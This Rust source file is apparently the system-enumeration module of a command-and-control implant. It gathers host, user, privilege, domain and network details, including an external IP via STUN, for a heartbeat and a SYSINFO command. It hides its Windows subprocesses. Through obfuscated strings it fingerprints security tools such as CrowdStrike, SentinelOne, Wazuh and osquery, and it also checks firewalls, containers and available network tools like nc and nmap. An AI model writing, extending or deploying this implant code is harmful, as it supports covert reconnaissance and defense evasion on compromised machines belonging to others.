//! Cross-platform system enumeration.
//! Returns the heartbeat string and an AgentInfo struct used by the main loop.

use crate::s;

pub struct AgentInfo {
    pub hostname: String,
    pub username: String,
    pub ip_int:   String,
    pub ip_ext:   String,
    pub os:       String,
    pub privs:    String,
    pub domain:   String,
    pub pid:      u32,
    pub process:  String,
    pub cwd:      String,
}

impl AgentInfo {
    pub fn collect(stun_ip: &str) -> Self {
        AgentInfo {
            hostname: hostname(),
            username: username(),
            ip_int:   local_ip(),
            ip_ext:   external_ip(stun_ip),
            os:       os_version(),
            privs:    privilege_level(),
            domain:   domain(),
            pid:      std::process::id(),
            process:  process_name(),
            cwd:      std::env::current_dir()
                .map(|p| p.display().to_string())
                .unwrap_or_default(),
        }
    }
}

// ── subprocess with timeout ───────────────────────────────────────────────────

/// Run a command with a timeout. Returns None on spawn failure or timeout.
/// On Windows the child is created with CREATE_NO_WINDOW.
fn cmd_output_timeout(cmd: &str, args: &[&str], timeout_secs: u64) -> Option<std::process::Output> {
    let mut builder = std::process::Command::new(cmd);
    builder.args(args)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        builder.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
    }
    let mut child = builder.spawn().ok()?;
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(timeout_secs);
    loop {
        match child.try_wait() {
            Ok(Some(_)) => return child.wait_with_output().ok(),
            Ok(None) => {
                if std::time::Instant::now() >= deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    return None;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
            Err(_) => {
                let _ = child.kill();
                let _ = child.wait();
                return None;
            }
        }
    }
}

// ── platform implementations ──────────────────────────────────────────────────

#[cfg(windows)]
mod platform {
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;

    fn wide_to_string(buf: &[u16]) -> String {
        let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
        OsString::from_wide(&buf[..end]).to_string_lossy().into_owned()
    }

    pub fn hostname() -> String {
        let mut buf = vec![0u16; 256];
        let mut len = buf.len() as u32;
        unsafe {
            // GetComputerNameW removed in windows-sys 0.52; use Ex with NetBIOS variant
            windows_sys::Win32::System::SystemInformation::GetComputerNameExW(
                windows_sys::Win32::System::SystemInformation::ComputerNameNetBIOS,
                buf.as_mut_ptr(), &mut len);
        }
        wide_to_string(&buf[..len as usize])
    }

    pub fn username() -> String {
        let mut buf = vec![0u16; 256];
        let mut len = buf.len() as u32;
        unsafe {
            windows_sys::Win32::System::WindowsProgramming::GetUserNameW(
                buf.as_mut_ptr(), &mut len);
        }
        wide_to_string(&buf[..len.saturating_sub(1) as usize])
    }

    pub fn os_version() -> String {
        let out = super::cmd_output_timeout("cmd", &["/c", "ver"], 10)
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            .unwrap_or_default();
        // `ver` returns "Microsoft Windows [Version X.Y.Z]" — strip the "Microsoft " prefix
        out.strip_prefix("Microsoft ").unwrap_or(&out).to_string()
    }

    pub fn privilege_level() -> String {
        let out = super::cmd_output_timeout("whoami", &["/groups"], 10)
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_default();
        // S-1-16-12288 = High Mandatory Level, S-1-16-16384 = System Mandatory Level
        if out.contains("S-1-16-12288") || out.contains("S-1-16-16384") {
            "Administrator".to_string()
        } else {
            "User".to_string()
        }
    }

    pub fn domain() -> String {
        let mut buf = vec![0u16; 256];
        let mut len = buf.len() as u32;
        unsafe {
            windows_sys::Win32::System::SystemInformation::GetComputerNameExW(
                windows_sys::Win32::System::SystemInformation::ComputerNameDnsDomain,
                buf.as_mut_ptr(), &mut len);
        }
        wide_to_string(&buf[..len as usize])
    }

    pub fn process_name() -> String {
        let mut buf = vec![0u16; 1024];
        let len = unsafe {
            // HMODULE = isize in windows-sys 0.52; 0 means current process module
            windows_sys::Win32::System::LibraryLoader::GetModuleFileNameW(
                0, buf.as_mut_ptr(), buf.len() as u32)
        };
        wide_to_string(&buf[..len as usize])
    }

    pub fn local_ip() -> String {
        // UDP connect trick: Winsock fills LocalAddr without sending any packet.
        // This asks the kernel routing table which source IP to use for 1.1.1.1,
        // correctly selecting the default-route interface on multi-homed hosts.
        if let Ok(sock) = std::net::UdpSocket::bind("0.0.0.0:0") {
            if sock.connect("1.1.1.1:80").is_ok() {
                if let Ok(addr) = sock.local_addr() {
                    let ip = addr.ip().to_string();
                    if !ip.starts_with("0.") && !ip.starts_with("127.") {
                        return ip;
                    }
                }
            }
        }
        // Fallback: parse ipconfig, first non-loopback IPv4 found.
        // Localisation-safe: matches "IPv4" regardless of surrounding text.
        let out = super::cmd_output_timeout("cmd", &["/c", "ipconfig"], 10)
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_default();
        for line in out.lines() {
            if line.trim().to_lowercase().contains("ipv4") {
                if let Some(ip) = line.trim().splitn(2, ':').nth(1) {
                    let ip = ip.trim();
                    if !ip.is_empty() && !ip.starts_with("127.") {
                        return ip.to_string();
                    }
                }
            }
        }
        "unknown".to_string()
    }
}

#[cfg(unix)]
mod platform {
    pub fn hostname() -> String {
        std::fs::read_to_string("/etc/hostname")
            .map(|s| s.trim().to_string())
            .or_else(|_| {
                let mut buf = vec![0u8; 256];
                unsafe {
                    libc::gethostname(buf.as_mut_ptr() as *mut libc::c_char, buf.len());
                }
                let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
                String::from_utf8(buf[..end].to_vec())
                    .map_err(|_| std::io::Error::new(std::io::ErrorKind::Other, "utf8"))
            })
            .unwrap_or_default()
    }

    pub fn username() -> String {
        unsafe {
            let uid = libc::getuid();
            let pw = libc::getpwuid(uid);
            if pw.is_null() { return "unknown".to_string(); }
            std::ffi::CStr::from_ptr((*pw).pw_name)
                .to_string_lossy()
                .into_owned()
        }
    }

    pub fn os_version() -> String {
        let mut u: libc::utsname = unsafe { std::mem::zeroed() };
        unsafe { libc::uname(&mut u) };
        let sysname = unsafe {
            std::ffi::CStr::from_ptr(u.sysname.as_ptr())
                .to_string_lossy()
                .into_owned()
        };
        let release = unsafe {
            std::ffi::CStr::from_ptr(u.release.as_ptr())
                .to_string_lossy()
                .into_owned()
        };
        let machine = unsafe {
            std::ffi::CStr::from_ptr(u.machine.as_ptr())
                .to_string_lossy()
                .into_owned()
        };
        format!("{} {} {}", sysname, release, machine)
    }

    pub fn privilege_level() -> String {
        if unsafe { libc::getuid() } == 0 {
            "root".to_string()
        } else {
            "user".to_string()
        }
    }

    pub fn domain() -> String { String::new() }

    pub fn process_name() -> String {
        std::fs::read_link("/proc/self/exe")
            .map(|p| p.display().to_string())
            .unwrap_or_default()
    }

    pub fn local_ip() -> String {
        // Ask the kernel which source IP it would use to reach 1.1.1.1.
        // `ip route get` is a pure routing-table query — zero packets sent.
        // This correctly handles multi-homed hosts and non-default metric routes.
        if let Some(out) = super::cmd_output_timeout("ip", &["route", "get", "1.1.1.1"], 5) {
            let s = String::from_utf8_lossy(&out.stdout);
            // Output: "1.1.1.1 via <gw> dev <iface> src <IP> uid <n>"
            let mut take_next = false;
            for token in s.split_whitespace() {
                if take_next {
                    if !token.starts_with("127.") && !token.is_empty() {
                        return token.to_string();
                    }
                    break;
                }
                if token == "src" { take_next = true; }
            }
        }
        // Fallback: UDP connect trick — kernel fills in the source address
        // without sending any packet (connect() on SOCK_DGRAM is local-only).
        if let Ok(sock) = std::net::UdpSocket::bind("0.0.0.0:0") {
            if sock.connect("1.1.1.1:80").is_ok() {
                if let Ok(addr) = sock.local_addr() {
                    let ip = addr.ip().to_string();
                    if !ip.starts_with("0.") { return ip; }
                }
            }
        }
        "unknown".to_string()
    }
}

// ── external IP (STUN) ────────────────────────────────────────────────────────

fn external_ip(stun_ip: &str) -> String {
    use std::net::UdpSocket;
    // Minimal STUN binding request
    let sock = match UdpSocket::bind("0.0.0.0:0") { Ok(s) => s, Err(_) => return String::new() };
    let _ = sock.set_read_timeout(Some(std::time::Duration::from_secs(3)));
    let _ = sock.connect(format!("{}:3478", stun_ip));
    // STUN Binding Request: type=0x0001, length=0, magic=0x2112A442, tx_id=12 random bytes
    let mut req = [0u8; 20];
    req[0] = 0x00; req[1] = 0x01;   // type
    req[4] = 0x21; req[5] = 0x12; req[6] = 0xA4; req[7] = 0x42; // magic
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut req[8..]);
    if sock.send(&req).is_err() { return String::new(); }
    let mut buf = [0u8; 512];
    let n = match sock.recv(&mut buf) { Ok(n) => n, Err(_) => return String::new() };
    // Parse MAPPED-ADDRESS or XOR-MAPPED-ADDRESS from response
    parse_stun_ip(&buf[..n])
}

fn parse_stun_ip(data: &[u8]) -> String {
    if data.len() < 20 { return String::new(); }
    let mut i = 20;
    while i + 4 <= data.len() {
        let attr_type = u16::from_be_bytes([data[i], data[i+1]]);
        let attr_len  = u16::from_be_bytes([data[i+2], data[i+3]]) as usize;
        i += 4;
        if i + attr_len > data.len() { break; }
        match attr_type {
            0x0001 if attr_len >= 8 => {
                // MAPPED-ADDRESS: family=data[i+1], port=[i+2..i+4], addr=[i+4..i+8]
                if data[i+1] == 0x01 {
                    let a = &data[i+4..i+8];
                    return format!("{}.{}.{}.{}", a[0], a[1], a[2], a[3]);
                }
            }
            0x0020 if attr_len >= 8 => {
                // XOR-MAPPED-ADDRESS: XOR address with magic cookie
                if data[i+1] == 0x01 {
                    let a = [data[i+4]^0x21, data[i+5]^0x12, data[i+6]^0xA4, data[i+7]^0x42];
                    return format!("{}.{}.{}.{}", a[0], a[1], a[2], a[3]);
                }
            }
            _ => {}
        }
        i += attr_len;
    }
    String::new()
}

// ── public re-exports ─────────────────────────────────────────────────────────

pub fn hostname()         -> String { platform::hostname() }
pub fn username()         -> String { platform::username() }
pub fn local_ip()         -> String { platform::local_ip() }
pub fn os_version()       -> String { platform::os_version() }
pub fn privilege_level()  -> String { platform::privilege_level() }
pub fn domain()           -> String { platform::domain() }
pub fn process_name()     -> String { platform::process_name() }

pub fn interfaces() -> String {
    #[cfg(windows)]
    {
        cmd_output_timeout("cmd", &["/c", "ipconfig"], 10)
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_default()
    }

    #[cfg(unix)]
    {
        cmd_output_timeout("ip", &["link"], 10)
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_else(|| {
                std::fs::read_to_string("/proc/net/dev")
                    .unwrap_or_default()
            })
    }
}

// Full SYSINFO report for the SYSINFO command — same section format as shell/ps1 templates
pub fn full_sysinfo() -> String {
    let mut out = String::new();
    out.push_str("=== SYSTEM INFO ===\n");
    out.push_str(&format!("Hostname:  {}\n", hostname()));
    out.push_str(&format!("Username:  {}\n", username()));
    out.push_str(&format!("OS:        {}\n", os_version()));
    out.push_str(&format!("Privs:     {}\n", privilege_level()));
    out.push_str(&format!("Domain:    {}\n", domain()));
    out.push_str(&format!("PID:       {}\n", std::process::id()));
    out.push_str(&format!("Process:   {}\n", process_name()));
    out.push_str(&format!("CWD:       {}\n",
        std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default()));

    out.push_str("\n=== HARDWARE ===\n");
    #[cfg(unix)]
    {
        let ncpu = std::fs::read_to_string("/proc/cpuinfo")
            .map(|s| s.lines().filter(|l| l.starts_with("processor")).count())
            .unwrap_or(0);
        out.push_str(&format!("CPU:       {} cores\n", ncpu));
        let mem = std::fs::read_to_string("/proc/meminfo")
            .ok()
            .and_then(|s| s.lines().find(|l| l.starts_with("MemTotal:"))
                .map(|l| l.split_whitespace().nth(1).unwrap_or("?").to_string()))
            .unwrap_or_else(|| "?".to_string());
        out.push_str(&format!("RAM:       {} kB\n", mem));
    }

    out.push_str("\n=== NETWORK ===\n");
    out.push_str(&format_interfaces());

    #[cfg(unix)]
    {
        out.push_str("\n=== AV/EDR ===\n");
        out.push_str(&format!("  {}\n", detect_edr_av()));
        out.push_str("\n=== FIREWALL ===\n");
        out.push_str(&format!("  {}\n", firewall_status()));
        out.push_str("\n=== CONTAINER ===\n");
        out.push_str(&format!("  {}\n", container_status()));
        out.push_str("\n=== NET TOOLS ===\n");
        out.push_str(&format!("  {}\n", available_net_tools()));
    }

    out
}

#[cfg(unix)]
fn detect_edr_av() -> String {
    let edr_processes = [
        s!("osqueryd"), s!("auditd"), s!("falco"), s!("wazuh"), s!("ossec"),
        s!("crowdstrike"), s!("sentinelone"), s!("carbonblack"), s!("cortex"),
        s!("elastic-agent"), s!("filebeat"), s!("auditbeat"),
    ];
    let edr_paths = [
        s!("/opt/osquery"),
        s!("/opt/wazuh"),
        s!("/opt/falco"),
        s!("/var/ossec"),
        s!("/opt/CrowdStrike"),
        s!("/opt/SentinelOne"),
        s!("/opt/carbonblack"),
        s!("/.fleet"),
    ];

    let mut detections = Vec::new();
    // Iterate /proc/*/exe via readlink — no execve, no child process spawn.
    if let Ok(entries) = std::fs::read_dir("/proc") {
        for entry in entries.flatten() {
            let exe_link = entry.path().join("exe");
            if let Ok(target) = std::fs::read_link(&exe_link) {
                let target_str = target.to_string_lossy().to_lowercase();
                for proc in &edr_processes {
                    let needle = proc.to_lowercase();
                    if target_str.contains(&needle)
                        && !detections.contains(&proc.to_string())
                    {
                        detections.push(proc.to_string());
                    }
                }
            }
        }
    }

    for path in &edr_paths {
        if std::path::Path::new(path.as_str()).exists() {
            let prefix = if path.len() >= 5 { &path[..5] } else { path.as_str() };
            if !detections.iter().any(|d: &String| d.contains(prefix)) {
                detections.push(format!("{}*", path));
            }
        }
    }

    if detections.is_empty() {
        "None detected".to_string()
    } else {
        detections.join(", ")
    }
}

#[cfg(unix)]
fn selinux_status() -> String {
    cmd_output_timeout("getenforce", &[], 5)
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_else(|| "N/A".to_string())
}

#[cfg(unix)]
fn firewall_status() -> String {
    let checks: &[(&str, &str, &[&str])] = &[
        ("iptables", "sh", &["-c", "iptables -L -n 2>/dev/null | grep -q 'Chain' && echo 'active' || echo 'inactive'"]),
        ("ufw",      "sh", &["-c", "ufw status 2>/dev/null | grep -q 'active' && echo 'active' || echo 'inactive'"]),
        ("firewalld", "firewall-cmd", &["--state"]),
    ];

    let mut status = Vec::new();
    for (name, cmd, args) in checks {
        if let Some(output) = cmd_output_timeout(cmd, args, 10) {
            let out_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !out_str.is_empty() && out_str != "inactive" {
                status.push(format!("{}: {}", name, out_str));
            }
        }
    }

    if status.is_empty() {
        "None active".to_string()
    } else {
        status.join(", ")
    }
}

#[cfg(unix)]
fn container_status() -> String {
    let mut detected = Vec::new();

    // Check if running inside a container
    if std::path::Path::new("/.dockerenv").exists() {
        detected.push("Running in Docker".to_string());
    } else if std::path::Path::new("/run/.containerenv").exists() {
        detected.push("Running in Podman".to_string());
    }

    // Check if container tools are available
    if std::path::Path::new("/var/run/docker.sock").exists() {
        if !detected.iter().any(|s| s.contains("Running")) {
            detected.push("Docker available".to_string());
        }
    }
    if std::path::Path::new("/run/podman/podman.sock").exists() {
        if !detected.iter().any(|s| s.contains("Running")) {
            detected.push("Podman available".to_string());
        }
    }
    if std::path::Path::new("/var/lib/lxc").exists() {
        detected.push("LXC available".to_string());
    }

    if detected.is_empty() {
        "None".to_string()
    } else {
        detected.join(", ")
    }
}

#[cfg(unix)]
fn available_net_tools() -> String {
    let tools = ["netstat", "ss", "nc", "nmap", "tcpdump", "curl", "wget"];
    let mut available = Vec::new();

    for tool in &tools {
        if let Some(output) = cmd_output_timeout("which", &[tool], 5) {
            if output.status.success() {
                available.push(tool.to_string());
            }
        }
    }

    if available.is_empty() {
        "None".to_string()
    } else {
        available.join(", ")
    }
}

#[cfg(windows)]
fn detect_edr_av() -> String {
    "Not implemented".to_string()
}

#[cfg(windows)]
fn firewall_status() -> String {
    "Not implemented".to_string()
}

#[cfg(windows)]
fn container_status() -> String {
    "Not implemented".to_string()
}

#[cfg(windows)]
fn available_net_tools() -> String {
    "Not implemented".to_string()
}

#[cfg(unix)]
fn format_interfaces() -> String {
    let output = cmd_output_timeout("ip", &["--brief", "addr"], 10);

    match output {
        Some(o) => {
            let stdout = String::from_utf8_lossy(&o.stdout);
            if !stdout.is_empty() {
                // Parse and format: "lo UNKNOWN 127.0.0.1/8 ::1/128" → "lo: 127.0.0.1/8, ::1/128"
                let formatted = stdout
                    .lines()
                    .map(|line| {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 2 {
                            let iface = parts[0];
                            let addrs = if parts.len() > 2 { parts[2..].join(", ") } else { String::new() };
                            if addrs.is_empty() {
                                format!("{}: (no addresses)", iface)
                            } else {
                                format!("{}: {}", iface, addrs)
                            }
                        } else {
                            line.to_string()
                        }
                    })
                    .collect::<Vec<_>>()
                    .join("\n");
                formatted
            } else {
                raw_interfaces()
            }
        }
        None => raw_interfaces(),
    }
}

#[cfg(unix)]
fn raw_interfaces() -> String {
    cmd_output_timeout("ip", &["link", "show"], 10)
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_else(|| {
            std::fs::read_to_string("/proc/net/dev")
                .unwrap_or_default()
        })
}

#[cfg(windows)]
fn format_interfaces() -> String {
    cmd_output_timeout("cmd", &["/c", "ipconfig"], 10)
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default()
}
